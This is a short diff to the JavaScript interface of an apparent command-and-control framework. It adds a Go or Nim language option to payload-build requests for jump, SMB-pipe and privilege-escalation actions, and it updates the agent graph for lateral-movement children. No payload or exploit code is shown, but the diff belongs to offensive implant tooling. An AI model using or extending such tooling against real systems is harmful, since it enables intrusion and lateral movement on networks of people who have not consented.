@@ -3689,7 +3689,7 @@ async function runCtxAction(act) {
             openConsoleFor(aid);
             addConsoleOutputForAgent(aid, `[jump] Building ${outName} → ${serverURL}…`, '', null);
             const buildR = await api('POST', '/api/build', {
-              format: fmt, transport: 'http',
+              lang: isSSH ? 'go' : 'nim', format: fmt, transport: 'http',
               server_url: serverURL,
               sleep_sec: agnt?.sleep_sec || 5, jitter_pct: agnt?.jitter_pct ?? 10,
               output_name: outName,
@@ -3773,7 +3773,7 @@ async function runCtxAction(act) {
         const tasks = [api('POST', `/api/agents/${aid}/task`, {type:'PIPE_START', args:effectivePipeName})];
         if (!existingPayload) {
           tasks.push(api('POST', '/api/build', {
-            format:'exe', transport:'smb',
+            lang:'nim', format:'exe', transport:'smb',
             smb_pipe: pipeUNC, server_url: serverURL,
             sleep_sec:5, jitter_pct:10, output_name: effectiveOutName,
           }));
@@ -3913,7 +3913,7 @@ async function runCtxAction(act) {
             openConsoleFor(aid);
             addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
             const buildR = await api('POST', '/api/build', {
-              format:'exe', transport, server_url: serverURL,
+              lang:'nim', format:'exe', transport, server_url: serverURL,
               sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
               output_name: outName,
             });
@@ -6677,6 +6677,7 @@ async function refreshAgents() {
             if (pr.ok) {
               a.parent_id = w.parentID;
               renderAgents();
+              if (agentView === 'graph') renderAgentGraph();
               addConsoleOutputForAgent(w.parentID,
                 `[+] lateral child ${a.id.substring(0,8)} (${a.hostname}) → parent set in graph`, '', null);
             }
@@ -6768,7 +6769,7 @@ function renderAgents() {
 let _lastAgentFingerprint = '';
 let _lastGraphFingerprint = '';
 function _agentFingerprint() {
-  return agents.map(a => `${a.id}:${agentStatus(a).color}:${a.transport}:${a.is_admin?1:0}`).sort().join('|') || 'empty';
+  return agents.map(a => `${a.id}:${agentStatus(a).color}:${a.transport}:${a.is_admin?1:0}:${a.parent_id||''}`).sort().join('|') || 'empty';
 }
 function _renderGraphIfChanged() {
   if (agentView !== 'graph') return;
